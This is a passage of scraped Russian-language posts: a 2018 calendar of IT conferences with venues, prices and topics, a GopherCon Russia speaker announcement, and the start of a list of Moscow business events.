Украина, Киев, ул. Вадима Гетьмана, 6, ТРЦ Космополит\r\nУсловия участия: 59 $ (3327 руб.)\n\r\nХорошо известное в сообществе мероприятие для разработчиков игр, где можно все: послушать других, рассказать самому, наладить контакты с титанами индустрии и даже приискать между делом работу. Насыщенная, как всегда, программа объединяет классические форматы вроде выступлений и воркшопов с трейдмарками организаторов — например, короткими, искрометными и безжалостными обзорами игр участников от экспертов.\n\nPGConf.Russia 2018\n\nКогда: 5-7 февраля\nГде: Москва, МГУ, физический факультет\nУсловия участия: уточняются\n\r\nТе, кого жизнь свела с PostgreSQL в любом качестве — администраторы баз данных, разработчики ядра и расширений PostgreSQL, прикладные разработчики, архитекторы информационных систем — могут углубить свое понимание возможностей системы и отшлифовать навыки на специализированной технической конференции. В качестве главных тем года завялены: «PostgreSQL на переднем крае: большие данные, интернет вещей, блокчейн», «Новое в PostgreSQL и вокруг: развитие PostgreSQL и его экосистемы», «PostgreSQL в реальных системах: архитектура, миграция, эксплуатация», «Использование PostgreSQL в платформе 1С и PostgreSQL в геоинформационных системах (GIS)», но программа ими не исчерпывается. Разнообразие форматов позволяет участникам выйти из роли пассивных слушателей — у них будет возможность поучаствовать в мастер-классах, выступить с блиц-докладом или посетить гостиную разработчиков. \n\nOpenTalks AI\n\nКогда: 7-9 февраля\nГде: Ленинградский проспект 39, стр. 79, метро Аэропорт\nУсловия участия: 24 000 руб.\n\r\nOpenTalks.AI — это возможность для всех, кто занимается технологиями искусственного интеллекта, заявить о себе, пообщаться и обменяться контактами с единомышленниками. Конференция проходит на английском языке и собирает участников из разных научных областей и стран мира, включая и самых авторитетных специалистов. Первый день будет посвящен обсуждению научных наработок, касающихся компьютерного зрения, обработки языка, анализа данных и предикативной аналитики, второй — отведен под кейсы от разработчиков действующих ИИ-решений и презентацию проектов; в последний же день разговор будет идти об этической и юридической сторонах создания и внедрения ИИ-технологий, об их глобальном значении и потенциале. В качестве зажигательного финала на площадке состоится Science-battle на сакраментальную тему искусственного интеллекта в его отношении к сознанию.\n\nBlockchain Conference\n\nКогда: 13 февраля \nГде: Санкт-Петербург, пл. Победы, 1, Парк Инн Рэдиссон Пулковская\nУсловия участия: 12 000 руб.\n\r\nМеждународная конференция о блокчейн-системах будет полезна, прежде всего, тем, кто готовит к выходу на рынок собственный проект. Помимо докладов о состоянии рынка сегодня, прогнозов, чего ждать от завтрашнего дня и вечнобольной темы законодательного регулирования, здесь прозвучит много конкретных рекомендаций от экспертов по проведению ICO, как с технической, так и с маркетинговой точки зрения. Тек, кто настроен воинственно и уверен в собственных силах, может принять участие в ICO Battle – конкурсе стартапов, победителей которого получат не только ценные советы, но и помощь в продвижении.\n\nОблака 2018: на пути к публичным сервисам\n\nКогда: 20 февраля\nГде: Москва (адрес уточнеятся)\nУсловия участия: 18 000 руб.\n\r\nCNews предлагает экспертам богатую тему для рассуждений и дебатов: облака, их перспективы и роль в процессе глобальной цифровой трансформации. Дискуссия, по большей части, будет вращаться вокруг специфики российского облачного рынка, который сейчас переживает фазу бурного хаотичного роста. Спикерам предлагается осветить такие темы, как темпы его развития, уровень услуг, место в мировой экономике, отношения с законодательством, соотношение частных и публичных облаков и, разумеется, перспективы в ближайшем будущем. \n\nTokenConf 2018\n\nКогда: 26-27 февраля\nГде: Москва, 1-й Зачатьевский пер., 4, Инфопространство\nУсловия участия: 17 000 руб.\n\r\nВсе в названии: организаторы приглашают профессионалов в сфере IT собраться, чтобы совместными усилиями ответить на простой вопрос — нужен ли блокчейн в вашем проекте? Разговор не будет сворачивать на то, как заработать на криптовалюте или правильно провести ICO — все внимание докладчиков и участников будет сосредоточено именно на технических возможностях блокчейна и их влиянии на бизнес-процессы. Речь в выступлениях пойдет о специфике создания блокчейн-платформ (архитектура, протоколы, безопасность, скорость), юридических сложностях (законодательство, связь с фиатом, волатильность), сфере применения децентрализованных систем, специфике новой экономики, позитивном и негативном опыте реализации от реальных компаний. Для начинающих предусмотрен короткий вводный курс лекций, который поможет разобраться в основах.\n\n\n\nJBreak 2018\n\nКогда: 4 марта\nГде: Новосибирск, ул. Станционная, 104\nУсловия участия: 10 000 руб.\n\r\nСибиряков, которые давно в теме и много работали с Java, ждет много интересного на мероприятии, которое организаторы без ложной скромности называют единственной Java-конференцией в регионе. Темы отобраны самые дискуссионные: производительность, concurrency, тестирование, распределённые системы и высокие нагрузки в мире Java и будущее платформы. Уже сейчас в программе значится несколько докладов на разношерстную тематику — от тестирования до машинного обучения — от представителей крупных компаний и приглашенных зарубежных экспертов.\n\nGopherCon\n\nКогда: 17 марта\nГде: Москва, Волгоградский проспект, 42к5\nУсловия участия: 6000 руб.\n\r\nСвежая инициатива для приверженцев Go, которая проводится в партнерстве с Gett, JetBrains, Google и другими интересными людьми. В данный момент заявлено 11 докладов от разнопрофильных специалистов — почитать о них можно в официальном анонсе мероприятия.\n\nCLOUD & DIGITAL TRANSFORMATION-2018\n\nКогда: 21 марта\nГде: Москва, Огородный проезд, 5, стр. 3\nУсловия участия: 21 414 руб.\n\r\nЦифровая трансформация и все то, из чего она складывается — то есть горячие темы вроде IoT, анализ больших массивов данных, MachineLearning, DevOps, Blockchain и облачных технологий. Организаторы амбициозно ставят перед собой цель рассмотреть весь спектр современных моделей и решений, связанных с цифровизацией, тренды, которые они показывают, вызовы, с которыми сталкиваются, и реальные кейсы, которые наглядно иллюстрируют все эти процессы.\n\nOpen Mobile Conference 2018\n\nКогда: 24 марта\nГде: Санкт-Петербург, наб. реки Карповки, 5, литера А, помещение 1-Н\nУсловия участия: 2000 руб.\n\r\nIT-монстры о глобальных трендах последнего десятилетия: диджитализации, геймификации, мобилизации и других. Увлекательная подача и неожиданные примеры. Доклады будут интересны как IT-специалистам, аналитикам и экспертам, так и представителям операторов связи и телекоммуникационных компаний.\n\nCodeFest\n\nКогда: 31 марта — 1 апреля\nГде: Новосибирск, Станционная, 104, Экспоцентр\nУсловия участия: 8 800 руб.\n\r\nМногопотоковая конференция в столице Сибири, объединяющая в себе разработку, тестирование, дизайн и управление проектами. Формирующаяся программа пока показывает здоровый баланс российских и зарубежных спикеров; среди тем доминируют бэкенд и менеджмент. Если вы хотите как-то подкорректировать баланс — организаторы активно принимают заявки от потенциальных докладчиков.\n\nJPoint 2018\n\nКогда: 6-7 апреля\nГде: Москва, Краснопресненская наб., 12, Конгресс-центр ЦМТ, 4й подъезд\nУсловия участия: 26 000 руб.\n\r\nСтоличным Java-разработчикам тоже будет чем заняться весной: уже ставший традиционным JPoint 2018 состоится в этом году в шестой раз. На повестке дня — всего понемногу: архитектура, инструменты, фреймворки, высоконагруженные и распределенные системы, производительность, DevOps, Data Science… Также на этот раз, помимо тысячи с лишним представителей отечественного сообщества, к обсуждению присоединятся специалисты из Pivotal, JetBrains, Azul Systems, Lightbend и некоторых других зарубежных команд.\n\nDUMP 2018\n\nКогда: 13 апреля\nГде: Экспо-центр, трансфер от ст.м. Геологическая\nУсловия участия: уточняются\n\r\nЕжегодная инициатива, которую компания IT-People.ru проводит для уральского сообщества разработчиков с 2011 года. В рамках этой конференции широкого профиля прозвучат доклады в восьми секциях: fronttalks (frontend разработка), Serverside (популярные технологии, новости науки и техники), Mobile (реактивное программирование, тестирование мобильных приложений, кросс-платформенная разработка, безопасность и новые языки программирования), Дизайн (инструменты дизайнера, UX), DevOps, Management (новые подходы к проектному менеджменту и управлению продуктом), Тестирование (классические проблемы) и Science.\n\nБольшие данные 2018\n\nКогда: 19 апреля\nГде: Москва (адрес уточняется)\nУсловия участия: 18 000 руб.\n\r\nИ еще один форум от CNews — на этот раз темой дня станут большие данные, их потенциал для систематизации информации и решения глобальных задач. Если у вас есть интересные материалы о крупных российских или зарубежных проектах в этой сфере, опыт преодоления сложностей или тесное знакомство со структурой рынка — вас ждут в качестве докладчика. Если же вам просто интересно, что происходит сейчас с этими технологиями и чем все это кончится — вы можете получить ответы на свои вопросы в зрительном зале.\n\nChatBot Conference\n\nКогда: 19 апреля\nГде: Москва (точный адрес будет объявлен позже)\nУсловия участия: информация уточняется\n\r\nЕдинственное в своем роде мероприятие для тех, у кого в бизнесе завелся чатбот или кто подумывает о том, чтобы его внедрить. Дискуссия планируется всеохватная, сочетающая в себе информацию о технической реализации (кейсы по внедрению, специфика применения, пользовательский опыт) и маркетинге, однако для удобства фильтрации эти два направления будут разделены на два последовательных потока. По завершению лекционной части на площадке будут организованы круглый стол, где можно вволю пообщаться со спикерами и экспертами и просто энтузиастами сектора, презентация совместных проектов участников, а также общение с представителями компаний-заказчиков для расширения деловых связей.\n\nC++ Russia\n\nКогда: 19-21 апреля\nГде: Санкт-Петербург, ул. Кораблестроителей, 14, гостиница Прибалтийская\nУсловия участия: 9500 руб.\n\r\nКонференция для разработчиков на C++ с высоким уровнем докладов, широким спектром тем и ярким национальным колоритом. Выступления будут проводиться по трем потокам на двух языках и касаться только и исключительно технических аспектов разработки. Сейчас в программе: crash репорты, акторы, алгоритмы и итераторы, разделяемые библиотеки — и это еще только начало: отбор спикеров продолжается.\n\n\n\nMobius 2018 Piter\n\nКогда: 20-21 апреля\nГде: Санкт-Петербург, площадь Победы, 1, гостиница «Park Inn by Radisson Пулковская»\nУсловия участия: 20 000 руб.\n\r\nВсе мыслимые и немыслимые аспекты мобильной разработки на iOS и Android. Свою аудиторию орагнизаторы Mobius определяют так: разработчики уровня Middle и Senior, тимлиды, руководители проектов и системные архитекторы, маркетологам просьба не беспокоить. Соответственно, и доклады в программе подбираются инженерные: это технологии (Java, Kotlin, Swift, Objective-C, JS Native), инструменты (мобильный DevOps, контейнеры, GPU-вычисления), фреймворки (Data binding, RxJava, Firebase, Realm) и архитектуры (MVP, MVVM, VIPER). Словом, максимум хардкора за ваши деньги. Подробный анонс читайте здесь же, на Хабре.\n\nDotNext\n\nКогда: 22-23 апреля\nГде: Санкт-Петербург, площадь Победы, 1, гостиница «Park Inn by Radisson Пулковская»\nУсловия участия: 20 000 руб.\n\r\nМеждународный сбор разработчиков на .NET. В ходе конференции докладчики заглянут в платформу изнутри (CLR, GC, JIT), поделятся лучшими практиками и кейсами профилирования и оптимизации производительности, расскажут о доступных инструментах и нововведениях, коснутся также многопоточного программирования. Более детально обсудить узкие проблемы участники смогут в специальных дискуссионных зонах.\n\nData Fest⁵\n\nКогда: 28 апреля\nГде: Москва, ул. Большая Новодмитровская, 36 FLACON\nУсловия участия: информация уточняется\n\r\nData Science: теория, практика, обмен кейсами. На конференции будет присутствовать разнообразная публика из сектора — исследователи, инженеры, разработчики, спикеры с громкими именами из академии и индустрии. Программа сочетает в себе доклады, практические занятия и интерактивы со возможностями для нетворкинга и вливания в сообщество.\n\nPositive Hack Days 8: Digital Bet\n\nКогда: 15-16 мая\nГде: Москва, Краснопресненская набережная, 12, Центр Международной Торговли\nУсловия участия: 7 337 руб.\n\r\nКонференция, на которой о цифровой экономике будут говорить без прикрас и радужного энтузиазма. PHDays предлагает нам взглянуть на изнанку складывающегося цифрового общества, реалистично и продуктивно взглянуть на те проблемы, которые вызовет, и уже вызывает, глобальная цифровизация. В частности, речь пойдет о роли государства и регуляторов в этих процессах, о специфике диджитал-экономики, о безопасности критической информационной инфраструктуры и мерах, которые должны быть приняты для снижения рисков и защиты данных. В дополнение к выступлениям профессионалов в сфере информационной безопасности планируются круглые столы, лабораторные практикумы и мастер-классы.\n\nHeisenbug 2018 Piter\n\nКогда: 17-18 мая\nГде: Санкт-Петербург, площадь Победы, 1, гостиница «Park Inn by Radisson Пулковская»\nУсловия участия: 17 000 руб.\n\r\nЦитируя официальные источники: «практическое и хардкорное тестирование на реальных проектах» — то есть доклады только от специалистов в сфере тестирования и только по делу. Отмечается, однако, что уровень докладов будет не настолько заоблачным, что постигнуть их будут способны только эксперты — нет, извлечь что-то полезное для себя смогут и просто программисты, которые периодически пишут тесты к своим проектам, и даже тимлиды, знакомые с процессом лишь в общих чертах. Круг обсуждаемых тем, по традиции, широк: автоматизация и ручное тестирование, нагрузочное тестирование, интеграционное тестирование модульных или распределённых систем, бенчмаркинг, concurrency testing, сопоставительный обзор инструментов, тестирование игр, метрики и даже UX и A/B.\n\nVoxxed Days Minsk\n\nКогда: 26 мая\nГде: Беларусь, Минск, пр. Победителей, 20, Mariott Hotel\nУсловия участия: 186 руб.\n\r\nКрупное международное Java-движение от Devoxx в этом году впервые осядет в Минске. С собой организаторы привезут целый ворох специалистов мирового уровня, готовых поделиться с аудиторией экспертизой — среди них Венкат Субраманьям, основатель Agile Developer, Inc., доклад которого откроет конференцию, Барух Садогурский из Jfrog и другие.\n\nApps Conf\n\nКогда: 28-29 мая\nГде: Сколково\nУсловия участия: 16 000 руб.\n\r\nСоздание и тестирование мобильных приложений в детальном освещении. Приглашаются разработчики как на iOS, так и на Android. Для первых готовятся доклады об Objective-C, Swift, OpenGL, Metal, вторые смогут узнать больше о Java, Kotlin, NDK и архитектуре приложений; а в трэках, касающихся архитектуры мобильной платформы, клиент-серверов, мобильной идентификации, аппаратного обеспечения и процессов разработки, найдется что-нибудь ценное для тех и других.\n\nBackend Conf\n\nКогда: 28-29 мая\nГде: Сколково, ул. Новая, 100\nУсловия участия: 16 000 руб.\n\r\nКонференция проходит под лозунгом «теория и практика программирования» — то есть тот универсальный комплект, который не повредит всем разработчикам, вне зависимости от их языковых и платформенных убеждений. В расшифровке это стандарты кодирования, рефакторинг, архитектурные паттерны, тестирование, организация программного кода, апрадигмы программирования, поддержка и решение стандартных рабочих ситуаций; в общем, все базовое, вечное и нужное.\n\nRootConf\n\nКогда: 28-29 мая\nГде: Сколково, ул. Новая, 100\nУсловия участия: 18 000 руб.\n\r\nСоздание и запуск IT-проекта — только первые этапы его жизненного цикла, и, возможно, обо всех последующих говорится недостаточно. Организаторы RootConf намерены поправить это упущение — конференция будет целиком посвящена проблемам поддержки и эксплуатации продуктов. Гости узнают, как осуществлять логгирование и мониторинг, какие существуют технологии виртуализации и контейнеризации, что понимается под управлением конфигурацией, какие могут возникнуть сложности с непрерывным развёртыванием и деплоем, как добиться отказоустойчивости и катастрофоустойчивости и какова специфика управления проектами на длинных дистанциях.\n\nHighLoad Junior\n\nКогда: 28-29 мая\nГде: Сколково, ул. Новая, 100\nУсловия участия: 16 000 руб.\n\r\nВысоконагруженные системы при ограниченных ресурсах и опыте — это не фантастика. Двадцать разработчиков с обширной экспертизой в этой сфере осветят всевозможные нюансы создания высоконагруженных решений силами небольшой команды. В выступлениях будут затронуты такие аспекты, как: архитектурные паттерны, горизонтальное и вертикальное масштабирование, использование очередей, оптимизация производительности, нагрузочное тестирование, балансировка, защита от DDoS, принципы отказоустойчивости, поиск узких мест и работа над ошибками. В промежутках между докладами участники смогут пообщаться с экспертами на митапах, поизучать стенды и поучаствовать в конкурсах.\n\nMobile Fest 2018\n\nКогда: 2 июня\nГде: Украина, Киев, ул. Вадима Гетьмана, 6, Mercure Congress Centre \nУсловия участия: 160 $ (9022 руб.)\n\r\nИ снова мобильная разработка во всем ее многообразии: iOS и Android, Swift и Kotlin, архитектура и кроссплафторменность, тестирование и мобильный дизайн. Организаторы делают особый акцент на жестком и безжалостном отборе материалов ради создания насыщенной программы с актуальными темами и свежими взглядами. Развлекательная часть продумана не менее тщательно: здесь можно будет и поиграть, и пообщаться, и расслабиться после выступления.\n\nHighLoad++\n\nКогда и где: \r\nНовосибирск (Экспоцентр) — 25-26 июня\r\nМосква — 7-8 ноября\nУсловия участия: от 15 000 руб.\n\r\nКонференция для тех, кто программирует по-крупному: масштабные проекты, высоконагруженные системы и как с ними управляться. На случай если кто-то колеблется между HighLoad++ и Codefest, организаторы подчеркивают, что их мероприятие более фокусное и покрывает лишь небольшую часть программы Codefest, но зато уж ее-то разбирает на совесть. В программе рассматривается широкий спектр специфических проблем разработки, тестирования и менеджмента в больших проектах: масштабирование, производительность, системы хранения, архитектура, аппаратное обеспечение, машинное обучение и работа с видео.\n\nWhite Nights Conference\n\nКогда и где: \r\nПрага — 13-14 февраля\r\nКипр — 26-27 апреля\r\nСанкт-Петербург — 28-29 июня\r\nМосква — 16-17 октября\n\nУсловия участия: от 150 € (10 383 руб.)\n\r\nОчередная серия конференций от Nevosoft для тех, кто делает игры. Доклады рассматривают различные аспекты разработки и продвижения игр на любых платформах (PC, консоли, веб, мобильные платформы); к участию привлекаются представители знаменитых студий со внушительной экспертизой. Для инди-разработчиков White Nights — хорошая возможность не только повысить свой уровень, но и обрасти связями или получить поддержку своего проекта — для этого можно принять участие в выставке проектов или чемпионате Indie Game Cup.\n\nЗарубежные страны\nDeveloper Week\n\nКогда: 3-7 февраля\nГде: США, Окленд, 10th Street, 550\nУсловия участия: от 55 $ (3099 руб.)\n\r\nПродолжительная и многолюдная конференция-выставка с «технологически нейтральным уклоном» — иными словами, обо всем понемногу. Доклады аккуратно сгруппированы по дням и потокам так, чтобы обеспечить тематическую стройность каждой сессии. По дев-направлению в различных блоках будут представлены доклады об AI, VR/AR микросервисах, Javascript, блокчейну, карьере в IT, а также практические занятия. В начале конференции пройдет также двухдневный хакатон с призовым фондом в 100,000 $.\n\nINDEX\n\nКогда: 20-22 февраля\nГде: США, Сан-Франциско, Howard Street 747\nУсловия участия: 350 $ (19 725 руб.)\n\r\nКонференция со впечатляющим размахом: в программе заявлено больше сотни докладов в 8 разных секциях. У участников есть возможность выбирать из целого ряда направлений: языки программирования (Java-языки, JavaScript, Scala, Spring, Go, Rust, R, Python, Swift, функциональные языки, инструменты и библиотеки); интернет-вещей и новое поколение приложений; облака, контейнеры и микросервисы, методологии… Секции ведут представители таких организаций, как Amazon, Spotify, IBM, GoDaddy. Организаторы призывают спикеров сосредоточиться на самых современных темах и технологиях и иллюстрировать свои тезисы кодом, который впоследствии будет доступен на GitHub.\n\nQCon London\n\nКогда: 5-9 марта\nГде: Великобритания, Лондон, Westminster, Broad Sanctuary, The Queen Elizabeth II Conference Centre London \nУсловия участия: 1 669 £ (129 360 руб.)\n\r\nЕще одно событие с размахом: по трем дням распределены по 18 тематическим трэкам по разработке, среди которых: микросервисы, AI, архитектура, бэкенд, фронтенд, производительность, распределенные системы, безопасность, мониторинг процессов разработки, этика в программировании… Рассуждать на эти темы будет более 150 приглашенных спикеров, среди которых — специалисты из Uber, Google, Facebook, Spotify, Twitter и многих других команд.\n\nBulgaria Web Summit 2018\n\nКогда: 14 апреля\nГде: Болгария, София, ул. Tsarigradsko shose, 147\nУсловия участия: цены будут указаны позже; открыта предварительная регистрация\n\r\nБолгарский саммит объединяет общей приверженностью к веб-тематике весьма пёстрый набор специалистов: в программе представлены фротенд, бэкенд, UX дизайн, безопасность, криптосектор, VR, IoT… Все это разнообразие разбито по четырем потокам, а расписание выстроено так, чтобы у участников была возможность сбалансировать интересующие их направления, будь то веб-разработка, дизайн или продвижение продукта. Занятный бонус — возможность взять с собой детей: для них будет организовано не только проживание, но и особый мини-курс мини-программиста.\n\nCodemotion\n\nКогда: 8-9 мая\nГде: Нидерланды, Амстердам, 1018 VN, Weesperstraat 61\nУсловия участия: от 270 € (20 927 руб.)\n\r\nОрганизаторы без ложной скромности называют свое детище «крупнейшей конференцией для разработчиков» и, судя по опыту прошлого года, на то есть свои основания — шестипотоковая программа с разнообразными темами по языкам, документации, деплою, безопаности, поддержке и тестированию производит впечатление. Среди приглашенных гуру фигурируют представители GitHub, Badoo, LinledIn и других известных компаний.\n\n\nPyCon\n\nКогда: 9-17 мая\nГде: США, Кливлэнд, 300 Lakeside Ave E, Huntington Convention Center \nУсловия участия: 400 $ (22 543 руб.)\n\r\nКонференция по Python отличается разнообразием форматов и инициатив. Программа у нее выстроена весьма изящно: первые два дня на площадке проходят семинары, где можно быстро перезнакомиться с участниками и подтянуть слабые места, следующие два отданы под стандартный конференционный набор — выступления экспертов, стендовые и блиц-доклады силами участников и выставка; наконец, в последние три весь накопленный кладезь новых умений и сведений можно применить для совместной работы на проектами. Для дальнейшего сплочения сообщества PyCon также между делом проводит ярмарку вакансий, где можно скрепить зарождающиеся профессиональные связи контрактом. \n\nphp[tek] 2018\n\nКогда: 29 мая — 1 июня\nГде: США, Атланта, Courtland Street 165\nУсловия участия: информация уточняется\n\r\nТринадцатая конференция по языку php для мирового сообщества. В своем открытом письме к спикерам организаторы подчеркивают, что отдают предпочтение докладам, касающимся PHP7, безопасности и тестирования, а также современной веб-разработки — HTML5, JavaScript, мобильная разработка и новейшие технологии. В программе будут фигурировать выступления, воркшопы и длительные тренинги.\n\nDevelop:Brighton\n\nКогда: 10-12 июля\nГде: Великобритания, Лондон, Shoreditch High Street 56\nУсловия участия: информация уточняется\n\r\nДемократичная площадка, где рады всем разработчикам игр — от компаний-монстров до крохотных инди-студий — и призывают их поделиться своим опытом выхода на рынок и послушать полезную информацию о новых инструментах и технологиях. В прошлом году на конференцию съехались более двух тысяч специалистов из геймдева, а в этом организаторы рассчитывают на еще более многочисленную и активную аудиторию.\n\r\nИнформацию о других зарубежных конференциях вы можете найти в этом списке или альтернативной подборке. Удачи в путешествиях и культурном обмене!", {"day": "17", "month": "января", "time": "14:28"}, {"rate": 12, "views": 15000}], ["Всем привет!\n\r\nРадостная новость для всех, кто любит Go — в России будет свой GopherCon с докладами и докладчиками :)\n\r\n17 марта в Москве выступят Brad Fitzpatrick и Дмитрий Вьюков из Google, Jessie Frazelle из Microsoft и не только. В программе уже 11 отборных выступлений, о которых мы подробно расскажем под катом, а до 20 января еще можно предложить свой доклад в CFP. \n\r\nБудет два параллельных потока, синхронный перевод в обе стороны в главном зале, огненное афтепати, крутые активности от наших партнеров (привет вам от Gett, JetBrains и Google). Ждем 400 участников, присоединяйтесь и вы!\n\nИтак, что в программе:\n\nДмитрий Вьюков, Google. Создатель race detector'а и execution tracer'а в Go, автор многих улучшений runtime языка. Приложил руку к поддержке параллелизма и многоядерности: параллельная сборка мусора, планировщик горутин, каналы, примитивы синхронизации и т.д. \nТема уточняется\n\n\nJessie Frazelle, Microsoft. Работает над поддержкой Linux и контейнеров в экосистеме Microsoft. Бывший мэйнтейнер Docker, контрибьютор в RunC, Kubernetes, Linux и Go.\n101 Ways to Compile a Go Binary\r\nLearn about the Go linker, interesting bugs and how they were fixed in the Go linker, and fun ways to link and build your applications for different use cases.\n\n\nBrad Fitzpatrick, Google. Участник команды Go, автор многих сетевых пакетов стандартной библиотеки. Предыдущие творения: LiveJournal, OpenID, memcached.\nТема уточняется\n\n\n\nМарко Кевац, Badoo. Системный программист, специалист в области высоконагруженных сервисов. Благодаря его продуктам миллионы людей по всему миру нашли свою половинку. \nЗнакомство с гео-библиотекой s2 от Google и примеры ее использования в Badoo\r\nСлужбы такси, социальные сети, игры, карты — все они регулярно собирают и обрабатывают местоположение пользователей. Марко познакомит нас с одной из библиотек для легкой работы с координатами. Рассмотрим основные примеры ее использования, узнаем как применять ее в высокопроизводительных сервисах на Go и услышим, для чего s2 используется в Badoo. \n\nАлексей Акулович, ВКонтакте. Backend разработчик, занимается «глубоким бэком» и инфраструктурой проекта. Продвигает Go как внутри компании, так и вне нее.\nРабота с сетью в Go\r\nРассмотрим варианты работы с HTTP, TCP, UDP как из stdlib, так и некоторые сторонние решения. От высокоуровневых, до прямых сисколов и их вариантов. Будут примеры кода, сравнения реализации, обязательные бенчмарки.\n\nАндрей Смирнов, Virtustream. Руководитель разработки, разработчик, фанат Go, Python, DevOps и больших нагрузок. Сегодня занимается разработкой экзабайтного облачного хранилища объектов. \nСоздание эффективной клиентской библиотеки statsd\r\nПошаговый рассказ о создании эффективной (как по памяти, так и по CPU) клиентской библиотеки для протокола statsd. Так как в случае statsd агрегация осуществляется на стороне сервера, приложение отправляет метрики в statsd с очень высокой скоростью, по несколько метрик на каждое измеряемое действие. Библиотека мониторинга не должна быть узким местом и не должна оказывать существенного влияния на производительность приложения. \n\n Станислав Афанасьев, Juno (Gett). Работал в геймдеве, hardware, соцсетях и аналитике, знаком с Java, Perl и Ruby. Уже два года занимается разработкой высоконагруженных бэкендов на Go в Juno, а именно гео-сервисами и реализацией алгоритмов.\nПишем свою криптовалюту на Go\r\nСтас напишет proof-of-concept криптовалюты и на практике покажет, как криптовалюты работают под капотом: генерация кошельков, создание транзакции на одной стороне, включение транзакции в блок и подтверждение «майнерами» этого блока, получение этого перевода на другой стороне и т.д. Упор сделаем на том как Go ложится на этот кейс — его плюсы, минусы, существующие решения и библиотеки, и т.п.\n\nГригорий Елеськин, Mobalytics. Играя в игры, успевает делать клевые вещи в сфере игровой аналитики. Пока никто не видит, занимается реверсом игровых протоколов и воссоздает их серверную часть в виде эмулирования.\nGo: плюсы и минусы на фоне языка Pony\r\nПоговорим об основных преимуществах Go и сравним его с языком Pony — основным будущим конкурентом по утилизации многоядерных систем. Поймем, какие минусы Go приобрел из-за направления на легкую обучаемость множества сотрудников в компании и сохранения общего стиля кода во время разработки. И узнаем, какие плюсы можно получить в будущем от Pony, который разрабатывается с учетом опыта Go / Erlang / Scala в совокупности идей на основе акторов.\n\nСергей Камардин, MailRu Group. Работает в команде почты. Занимается разработкой сервисов по обмену сообщениями между системами почты и конечными пользователями.\nRestarting Go applications gracefully\r\nЧто такое graceful рестарт? Для чего он нужен? Как это работает на Linux? Как это реализовать на Go? Как возможность graceful рестартов зависит от протоколов? Поговорим об этом и немнго о врапперах процессов.\n\nАлексей Найденов, ITooLabs, CEO. В 2012 рискнул запустить сложный проект телефонного коммутатора на Pre-Go 1, и не ошибся. Руководит компанией, придумывает архитектуры, пишет код.\nВстраивание в Go интерпретатора JS для реализации бизнес-логики\r\nВ ITooLabs шесть лет назад решили перепридумать телефонный коммутатор для своего сервиса, и написали высоконагруженную платформу, способную выполнять сложные сценарии обработки вызовов на Go. Эти сценарии пишутся на встроенном в платформе языке — реализации Javascript. Обсудим, зачем встраивать в продукт на Go интерпретируемый язык, как увязать его с моделью исполнения Go, как встроить интерпретируемые задачи в кластер для масштабируемости и многое другое.\n\nАндрей Минкин, Mad Devs. Тимлид, любит Go и пишет на нем больше 3х лет.\nБекенд на Go+grpc в продакшне для мобильных приложений\r\nДоклад о grpc на реальном кейсе — альтернативы, грабли, преимущества, эксплуатация. Поговорим про трассировку и отладку, о том как балансировать grpc на серверах и многом другом.\n\n\r\nПрограмма еще формируется, поэтому если вам есть о чем рассказать — пишите в CFP до 20 января. Билет сейчас стоит 6000 рублей, но с 1 февраля поднимется на 1000, не откладывайте.\r\nВсе подробности и регистрация на сайте. А следить за анонсами можно в телеграм-канале или твиттере.\n\nУвидимся в марте в Москве!", {"day": "16", "month": "января", "time": "12:54"}, {"rate": 38, "views": 5600}], ["Подборка Telegram-канала @mоs_events\n\nОн-лайн курс для event-менеджеров\n\n04.12.2017\nонлайн\nот 5000 р.\n\nThe Future of Collaboration\n\n04.12.2017\nул. Мясницкая, д. 13, стр. 18\nбесплатно\n\nБизнес-встреча «Как и зачем предоставлять качественную клиентскую поддержку»\n\n05.12.2017\nКонференц-центр Newsroom, ул. Поклонная, д.3А корпус 4﻿\nбесплатно\nЭксперты клиентской поддержки поделятся практическими кейсами и расскажут, что можно сделать уже сейчас, чтобы клиенты перестали уходить, оставались довольными и приносили больше денег.\n\nОткрытая лекция Ильи Варламова \"История моих провалов\"\n05.12.2017\n\nКоворкинг Атмосфера, Ленинский проспект 109\nбесплатно\nУ большого успеха нет рецептов. То, что сработало один раз – больше не сработает. А вот ошибки повторяются вновь и вновь. \"На ошибках учатся\" – это было сказано еще давно и до сих пор остается правдой. \n\nЧеловек и машина — выгодный союз или жесткая конкуренция?\n\n05.12.2017\nОсобняк на Волхонке, Большой Знаменский переулок 2c3\nбесплатно\nКомпьютеры смогли обыграть людей в игры, требующие не только расчета вариантов, но и интуитивных действий, творческого мышления. Созданная в «Яндексе» нейросеть сочиняет музыку. Искусственный интеллект научился действиям, которые еще недавно считались прерогативой человека. Машины уже лучше специалистов справляются с медицинской диагностикой.\r\nКакие перемены ждут нас в ближайшие 10-20 лет в области искусственного интеллекта? Научатся ли машины обучаться, исследуя большие массивы данных? И что делать людям, когда врачами, пилотами, водителями и даже композиторами станут машины?\r\nОб этом расскажет директор по маркетингу сервисов компании «Яндекс» Андрей Себрант.\n\nМашинное обучение как услуга для бизнеса\n\n06.12.2017\nКультурный центр ЗИЛ, ул. Восточная, д.4, корп.1\nбесплатно\n6 декабря состоится вторая лекция цикла «Data culture: машинное обучение и цифровая трансформация» на тему «Машинное обучение как услуга для бизнеса» в рамках проекта «Университет, открытый городу: лекции молодых ученых Вышки в Культурном центре ЗИЛ».\r\nЛектор – Александр Белугин, преподаватель факультета компьютерных наук НИУ ВШЭ, руководитель проектного офиса Yandex Data Factory.\n\nPizza Pitch\n\n07.12.2017\nул.Кирпичная, 33 стр 2\n200 р.\nВ Бизнес–инкубаторе ВШЭ пройдут открытые презентации, где каждый гость сможет рассказать про свой проект, поделиться идеей, услышать обратную связь, найти новые контакты и пообщаться с единомышленниками.\n\n27-й Международный фестиваль рекламы Red Apple\n\n07.12.2017 — 08.12.2017\nDigital October, Deworkacy, Берсеневская набережная, 6c3\n3000 р.\nRed Apple – крупнейшее событие, объединяющее ведущих профессионалов в области мирового маркетинга и рекламы, а также самый престижный в России фестиваль рекламы. Традиционно фестиваль собирает на одной площадке ведущих креативных специалистов крупнейших международных и российских коммуникационных агентств, руководителей отделов рекламы и маркетинга крупнейших компаний — рекламодателей. \n\nБесплатная беговая тренировка с чемпионами мира и Decathlon\n\n09.12.2017\nDecathlon Мега Белая Дача, Котельники, 1-й Покровский проезд, 1\nбесплатно\nЧемпионы мира совместно с Decathlon делают бесплатный проект целью которого заинтересовать людей беговыми лыжами, помочь с теоретической подготовкой, правильно поставить технику и научить получать удовольствие.\n\nMcKinsey Hackathon (совместно с Gett)\n\n09.12.2017 — 10.12.2017\nбесплатно\n24-часовой хакатон с призовым фондом 1 000 000 рублей для тех, кто 